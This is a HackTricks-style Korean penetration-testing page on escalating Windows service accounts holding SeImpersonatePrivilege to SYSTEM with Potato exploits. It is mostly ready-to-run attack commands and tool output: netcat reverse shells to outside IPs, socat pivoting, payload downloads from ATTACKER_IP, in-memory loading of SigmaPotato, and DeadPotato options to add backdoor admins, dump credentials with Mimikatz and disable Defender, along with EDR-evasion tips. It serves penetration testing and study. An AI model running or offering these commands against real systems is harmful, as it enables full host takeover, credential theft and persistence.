# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> Windows Server 2019 및 Windows 10 build 1809 이후 버전에서는 **JuicyPotato가 작동하지 않습니다**. 하지만 [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**를 사용하여 **동일한 privileges를 leverage하고 `NT AUTHORITY\SYSTEM`** 수준의 access를 얻을 수 있습니다. 이 [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)에서는 `PrintSpoofer` tool을 심층적으로 다루며, JuicyPotato가 더 이상 작동하지 않는 Windows 10 및 Server 2019 host에서 impersonation privileges를 abuse하는 데 사용할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> 2024–2025년에 자주 유지 관리되는 최신 alternative는 SigmaPotato(GodPotato의 fork)입니다. 이 tool은 in-memory/.NET reflection 사용 및 확장된 OS support를 추가합니다. 아래의 간단한 usage와 References의 repo를 참조하세요.

background 및 manual techniques 관련 페이지:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements 및 일반적인 주의 사항

다음의 모든 techniques는 다음 privileges 중 하나를 보유한 context에서 impersonation-capable privileged service를 abuse하는 방식에 의존합니다.

- SeImpersonatePrivilege (가장 일반적) 또는 SeAssignPrimaryTokenPrivilege
- token에 이미 SeImpersonatePrivilege가 있다면 High integrity는 필요하지 않습니다(IIS AppPool, MSSQL 등 많은 service account에서 일반적).

다음 명령으로 privileges를 빠르게 확인합니다:
```cmd
whoami /priv | findstr /i impersonate
```
운영 참고 사항:

- 셸이 SeImpersonatePrivilege가 없는 restricted token으로 실행되는 경우(일부 컨텍스트에서 Local Service/Network Service에 흔함), FullPowers를 사용해 계정의 기본 권한을 복구한 다음 Potato를 실행합니다. 예: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer를 사용하려면 Print Spooler 서비스가 실행 중이며 로컬 RPC endpoint(spoolss)를 통해 연결 가능해야 합니다. PrintNightmare 이후 Spooler가 비활성화된 hardened environment에서는 RoguePotato/GodPotato/DCOMPotato/EfsPotato를 우선 사용합니다.
- RoguePotato를 사용하려면 TCP/135에서 OXID resolver에 연결할 수 있어야 합니다. egress가 차단된 경우 redirector/port-forwarder를 사용합니다(아래 예시 참고). 이전 빌드에서는 -f flag가 필요했습니다.
- EfsPotato/SharpEfsPotato는 MS-EFSR을 악용합니다. 한 pipe가 차단된 경우 대체 pipe(lsarpc, efsrpc, samr, lsass, netlogon)를 시도합니다.
- RpcBindingSetAuthInfo 중 오류 0x6d3은 일반적으로 알 수 없거나 지원되지 않는 RPC authentication service를 의미합니다. 다른 pipe/transport를 시도하거나 target service가 실행 중인지 확인합니다.
- DeadPotato와 같은 “Kitchen-sink” fork는 추가 payload module(Mimikatz/SharpHound/Defender off)을 포함하며 디스크에 흔적을 남깁니다. 따라서 slim original에 비해 EDR detection이 더 높을 수 있습니다.

## 간단한 Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
참고:
- `-i`를 사용하면 현재 콘솔에서 interactive process를 생성하거나, `-c`를 사용하면 one-liner를 실행할 수 있습니다.
- Spooler 서비스가 필요합니다. 비활성화되어 있으면 실패합니다.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
outbound 135가 차단된 경우, redirector에서 socat을 통해 OXID resolver를 pivot하세요:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato는 2022년 말에 공개된 최신 COM abuse primitive로, Spooler/BITS 대신 **PrintNotify** service를 대상으로 합니다. 이 binary는 PrintNotify COM server를 인스턴스화하고, 가짜 `IUnknown`를 주입한 다음 `CreatePointerMoniker`를 통해 privileged callback을 트리거합니다. **SYSTEM** 권한으로 실행 중인 PrintNotify service가 callback을 통해 연결되면, process는 반환된 token을 duplicate하고 제공된 payload를 full privileges로 실행합니다.<sup>[[13]](#references)</sup>

주요 운영 참고 사항:

* Print Workflow/PrintNotify service가 설치되어 있는 한 Windows 10/11 및 Windows Server 2012–2022에서 작동합니다. (PrintNightmare 이후 legacy Spooler가 비활성화되어 있어도 기본적으로 존재합니다.)
* 호출 context가 **SeImpersonatePrivilege**를 보유해야 합니다. (IIS APPPOOL, MSSQL 및 scheduled-task service account에서 일반적입니다.)
* direct command 또는 interactive mode를 사용할 수 있으므로 원래 console 내부에 계속 머무를 수 있습니다. 예시:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 순수하게 COM 기반으로 동작하므로 named-pipe listener나 external redirector가 필요하지 않습니다. 따라서 Defender가 RoguePotato의 RPC binding을 차단하는 host에서 drop-in replacement로 사용할 수 있습니다.

Ink Dragon과 같은 operator는 SharePoint에서 ViewState RCE를 획득한 직후 PrintNotifyPotato를 실행하여 `w3wp.exe` worker에서 SYSTEM으로 pivot한 다음 ShadowPad를 설치합니다.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
팁: 하나의 pipe가 실패하거나 EDR이 이를 차단하면 지원되는 다른 pipe를 시도하세요:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
참고:
- SeImpersonatePrivilege가 있는 경우 Windows 8/8.1–11 및 Server 2012–2022에서 작동합니다.
- 설치된 runtime에 맞는 binary를 가져옵니다(예: 최신 Server 2022에서는 `GodPotato-NET4.exe`).
- 초기 execution primitive가 timeout이 짧은 webshell/UI인 경우, payload를 script로 staging한 다음 긴 inline command 대신 GodPotato에 실행을 요청합니다.<sup>[[12]](#references)</sup>

쓰기 가능한 IIS webroot에서의 간단한 staging 패턴:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato는 기본값이 RPC_C_IMP_LEVEL_IMPERSONATE인 서비스 DCOM 객체를 대상으로 하는 두 가지 변형을 제공합니다. 제공된 바이너리를 빌드하거나 사용하여 명령을 실행하세요:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato는 .NET reflection을 통한 in-memory execution과 PowerShell reverse shell helper 같은 최신 편의 기능을 추가합니다.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
2024–2025 빌드(v1.2.x)의 추가 기능:
- 내장 reverse shell 플래그 `--revshell` 및 1024자 PowerShell 제한 제거로, 긴 AMSI-bypassing payload를 한 번에 실행할 수 있습니다.
- Reflection 친화적인 구문(`[SigmaPotato]::Main()`)과 간단한 heuristic을 교란하는 `VirtualAllocExNuma()` 기반의 기초적인 AV evasion 기법을 제공합니다.
- PowerShell Core 환경을 위해 .NET 2.0에 맞춰 컴파일된 별도의 `SigmaPotatoCore.exe`를 제공합니다.

### DeadPotato (2024년 GodPotato rework with modules)

DeadPotato는 GodPotato의 OXID/DCOM impersonation chain을 유지하면서 post-exploitation helper를 내장하여, operator가 추가 tooling 없이 즉시 SYSTEM 권한을 획득하고 persistence/collection을 수행할 수 있도록 합니다.<sup>[[15]](#references)</sup>

일반적인 modules(모두 SeImpersonatePrivilege 필요):

- `-cmd "<cmd>"` — SYSTEM 권한으로 임의의 command 실행.
- `-rev <ip:port>` — 빠른 reverse shell.
- `-newadmin user:pass` — persistence를 위해 local admin 생성.
- `-mimi sam|lsa|all` — credential을 dump하기 위해 Mimikatz를 저장하고 실행(디스크에 기록되며 noisy).
- `-sharphound` — SYSTEM 권한으로 SharpHound collection 실행.
- `-defender off` — Defender real-time protection 비활성화(매우 noisy).

One-liner 예시:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
추가 바이너리가 포함되어 있으므로 AV/EDR 탐지 가능성이 더 높습니다. 은밀성이 중요하다면 더 간결한 GodPotato/SigmaPotato를 사용하세요.

## References

- [1] [PrintSpoofer – Windows 10 및 Server 2019에서 Impersonation Privileges 악용](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [JuicyPotato는 이제 끝인가? 오래된 이야기, RoguePotato를 소개합니다](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – service account의 기본 token privileges 복원](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — WMP NTLM leak → NTFS junction을 통한 webroot RCE → FullPowers + GodPotato로 SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — LibreOffice macro → IIS webshell → GodPotato로 SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Inside Ink Dragon: Relay Network 및 은밀한 Offensive Operation의 내부 동작 분석](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – 내장된 post-ex modules를 포함한 GodPotato rework](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
